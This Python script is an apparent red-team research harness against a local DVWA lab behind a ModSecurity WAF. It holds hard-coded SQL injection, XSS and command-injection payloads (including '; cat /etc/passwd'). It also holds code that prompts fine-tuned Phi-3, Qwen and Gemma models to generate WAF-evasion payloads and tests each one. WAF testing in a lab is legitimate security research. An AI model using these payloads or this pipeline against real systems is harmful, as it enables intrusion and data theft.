import os
import logging
import random
import time
import httpx
import re
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel

# --- Configuration ---
DVWA_URL = "http://localhost:8000/dvwa"
LOGIN_URL = f"{DVWA_URL}/login.php"
SQLI_URL = f"{DVWA_URL}/vulnerabilities/sqli/"
USERNAME = "admin"
PASSWORD = "password"

# Probing Payloads (A mix of common techniques)
PROBING_PAYLOADS = [
    {"payload": "' OR 1=1 --", "technique": "Tautology"},
    {"payload": "%27%20OR%20%271%27%3D%271", "technique": "Double URL Encode"},
    {"payload": "1/**/OR/**/1=1", "technique": "Comment Obfuscation"},
    {"payload": "<script>alert(1)</script>", "technique": "Basic XSS"},
    {"payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "technique": "URL Encoded XSS"},
    {"payload": "; cat /etc/passwd", "technique": "OS Command Injection"},
    {"payload": "1' AND SLEEP(5)--", "technique": "Time-based Blind SQLi"},
    {"payload": "admin' #", "technique": "SQLi Comment #"},
    {"payload": "1 UNION SELECT 1, version()", "technique": "Union Select"},
    {"payload": "<svg onload=alert(1)>", "technique": "SVG XSS"}
]

# Logging
logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")
logger = logging.getLogger("AttackPipeline")

class AttackPipeline:
    def __init__(self, model_path, adapter_path, model_type="phi3"):
        self.client = httpx.Client(timeout=10.0, follow_redirects=True)
        self.model_path = model_path
        self.adapter_path = adapter_path
        self.model_type = model_type
        self.model = None
        self.tokenizer = None
        self.history = [] # Stores (payload, result) tuples
    
    def _format_prompt(self, prompt):
        """Format prompt according to model's chat template."""
        if self.model_type == "phi3":
            return f"<|user|>\n{prompt}<|end|>\n<|assistant|>\n"
        elif self.model_type == "qwen":
            return f"<|im_start|>user\n{prompt}<|im_end|>\n<|im_start|>assistant\n"
        elif self.model_type == "gemma":
            return f"<start_of_turn>user\n{prompt}<end_of_turn>\n<start_of_turn>model\n"
        else:
            # Fallback to Phi-3
            return f"<|user|>\n{prompt}<|end|>\n<|assistant|>\n"

    def login(self):
        logger.info(f"Logging into {DVWA_URL}...")
        try:
            r = self.client.get(LOGIN_URL)
            m = re.search(r"user_token'\s*value='([a-f0-9]{32})'", r.text, re.I)
            if not m:
                logger.error("Token not found.")
                return False
            token = m.group(1)
            r = self.client.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"})
            if "login.php" not in str(r.url):
                logger.info("Login successful.")
                return True
            logger.error("Login failed.")
            return False
        except Exception as e:
            logger.error(f"Login error: {e}")
            return False

    def load_model(self):
        logger.info(f"Loading model: {self.model_path}")
        bnb_config = BitsAndBytesConfig(
            load_in_4bit=True, bnb_4bit_quant_type="nf4", bnb_4bit_compute_dtype=torch.float16
        )
        self.model = AutoModelForCausalLM.from_pretrained(
            self.model_path, quantization_config=bnb_config, device_map="auto", token=os.environ.get("HF_TOKEN")
        )
        self.model = PeftModel.from_pretrained(self.model, self.adapter_path)
        self.tokenizer = AutoTokenizer.from_pretrained(self.model_path, token=os.environ.get("HF_TOKEN"))
        logger.info("Model loaded.")

    def probe_waf(self):
        logger.info("--- Phase 1: Probing WAF ---")
        results = []
        for item in PROBING_PAYLOADS:
            status = self._send_payload(item["payload"])
            result_str = "PASSED" if status else "BLOCKED"
            results.append({"payload": item["payload"], "technique": item["technique"], "result": result_str})
            logger.info(f"Probe: {item['payload'][:30]}... -> {result_str}")
        return results

    def _send_payload(self, payload):
        try:
            # Defaulting to SQLi endpoint for demo
            r = self.client.get(SQLI_URL, params={"id": payload, "Submit": "Submit"})
            if r.status_code == 403:
                return False # Blocked
            # Simple check for SQL error or success
            if "error" in r.text.lower() or "id:" in r.text.lower():
                return True # Passed (either executed or WAF let it through to app error)
            return True # Passed WAF
        except:
            return False

    def generate_phase1_payloads(self, num_payloads=5):
        """Phase 1: Direct SQLi payload generation without probing."""
        techniques = [
            "Double URL Encode", "Comment Obfuscation", "Hex Encoding",
            "Case Manipulation", "Inline Comment", "Null Byte Injection"
        ]
        
        results = []
        for i in range(num_payloads):
            technique = techniques[i % len(techniques)]
            
            # Simple Phase 1 prompt
            prompt = f"""Generate a SQL injection payload using {technique} technique.
Output ONLY the payload string. Do NOT add explanations or code fences."""
            
            formatted_prompt = self._format_prompt(prompt)
            inputs = self.tokenizer(formatted_prompt, return_tensors="pt").to(self.model.device)
            input_length = inputs.input_ids.shape[1]
            
            with torch.no_grad():
                outputs = self.model.generate(**inputs, max_new_tokens=64, temperature=0.7, do_sample=True)
            
            response = self.tokenizer.decode(outputs[0][input_length:], skip_special_tokens=True)
            payload = response.strip()
            
            # Clean up
            if payload.startswith("```") or payload.startswith("`"):
                lines = payload.split("\n")
                payload = "\n".join([l for l in lines if not l.strip().startswith("`")])
                payload = payload.strip()
            
            logger.info(f"[{i+1}/{num_payloads}] Technique: {technique}")
            logger.info(f"  Generated: {payload}")
            
            # Test payload
            status = self._send_payload(payload)
            result_str = "PASSED" if status else "BLOCKED"
            logger.info(f"  Result: {result_str}")
            
            results.append({
                "technique": technique,
                "payload": payload,
                "result": result_str
            })
            
        # Summary
        passed = sum(1 for r in results if r["result"] == "PASSED")
        logger.info(f"\n=== Summary: {passed}/{num_payloads} payloads PASSED ===")
        return results

    def generate_attack(self, probe_history):
        logger.info("--- Phase 3: Adaptive Attack ---")
        
        # Format history for prompt
        history_str = ""
        for i, h in enumerate(probe_history):
            history_str += f"{i+1}. Payload: `{h['payload']}` (Technique: {h['technique']}`) -> RESULT: {h['result']}\n"

        prompt = f"""You are an offensive security assistant specialized in generating WAF-evasion payloads.

Context:
- Target WAF: ModSecurity + OWASP CRS 3.3 (PL1).
- Attack type: SQLI.
- Injection point: query parameter.

[Probing History - Previous Attempts]
{history_str}

Your Task:
Analyze the Probing History above.
- If a specific technique or pattern PASSED, analyze why and generate a similar but new payload.
- If all attempts were BLOCKED, try a completely DIFFERENT technique from the ones listed.
- Generate a NEW payload targeting: Double URL Encode (Adaptive).

IMPORTANT:
- Output ONLY the final payload string.
- Do NOT add explanations.
- Do NOT wrap in code fences."""

        # Format prompt using model-specific chat template
        formatted_prompt = self._format_prompt(prompt)
        
        inputs = self.tokenizer(formatted_prompt, return_tensors="pt").to(self.model.device)
        input_length = inputs.input_ids.shape[1]
        
        with torch.no_grad():
            outputs = self.model.generate(**inputs, max_new_tokens=128, temperature=0.7, do_sample=True)
        
        # Decode only NEW tokens (skip input prompt)
        response = self.tokenizer.decode(outputs[0][input_length:], skip_special_tokens=True)
        
        # Clean up payload - remove any remaining special tokens or whitespace
        payload = response.strip()
        
        # Additional cleanup: remove code fences if present
        if payload.startswith("```") or payload.startswith("`"):
            lines = payload.split("\n")
            payload = "\n".join([l for l in lines if not l.strip().startswith("`")])
            payload = payload.strip()
            
        logger.info(f"Generated Payload: {payload}")
        
        # Verify
        status = self._send_payload(payload)
        result_str = "PASSED" if status else "BLOCKED"
        logger.info(f"Attack Result: {result_str}")

def find_latest_checkpoint(base_path):
    """Find the latest checkpoint in adapter directory."""
    import glob
    checkpoints = glob.glob(os.path.join(base_path, "checkpoint-*"))
    if not checkpoints:
        # No checkpoint subdirectory, use base path directly
        return base_path
    # Sort by checkpoint number and return latest
    checkpoints.sort(key=lambda x: int(x.split("-")[-1]))
    return checkpoints[-1]

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Run Red Team Attack Pipeline")
    parser.add_argument("--phase", type=int, choices=[1, 3], default=1, 
                        help="Training phase: 1 (SFT only) or 3 (RL adaptive)")
    parser.add_argument("--model", type=str, default="phi3", choices=["phi3", "qwen", "gemma"],
                        help="Model to use: phi3, qwen, or gemma")
    parser.add_argument("--num-payloads", type=int, default=5,
                        help="Number of payloads to generate (Phase 1 only)")
    args = parser.parse_args()
    
    # Model mapping
    model_configs = {
        "phi3": {
            "base": "microsoft/Phi-3-mini-4k-instruct",
            "phase1": "./experiments/remote_phi3_mini_phase1",
            "phase3": "./experiments/remote_phi3_mini_phase3_rl"
        },
        "qwen": {
            "base": "Qwen/Qwen2.5-3B-Instruct",
            "phase1": "./experiments/remote_qwen_3b_phase1",
            "phase3": "./experiments/remote_qwen_3b_phase3_rl"
        },
        "gemma": {
            "base": "google/gemma-2-2b-it",
            "phase1": "./experiments/remote_gemma2_2b_phase1",
            "phase3": "./experiments/remote_gemma2_2b_phase3_rl"
        }
    }
    
    config = model_configs[args.model]
    base_model = config["base"]
    adapter_base = config[f"phase{args.phase}"]
    adapter = find_latest_checkpoint(adapter_base)
    
    logger.info(f"=== Red Team Attack Pipeline ===")
    logger.info(f"Model: {args.model} | Phase: {args.phase}")
    logger.info(f"Adapter: {adapter}")
    
    pipeline = AttackPipeline(base_model, adapter, model_type=args.model)
    
    if not pipeline.login():
        logger.error("Login failed. Exiting.")
        return
    
    pipeline.load_model()
    
    if args.phase == 1:
        # Phase 1: Direct generation (no probing needed)
        logger.info(f"--- Phase 1: Direct Generation ({args.num_payloads} payloads) ---")
        pipeline.generate_phase1_payloads(args.num_payloads)
    else:
        # Phase 3: Adaptive attack with probing
        logger.info("--- Phase 3: Adaptive RL Attack ---")
        history = pipeline.probe_waf()
        pipeline.generate_attack(history)

if __name__ == "__main__":
    main()
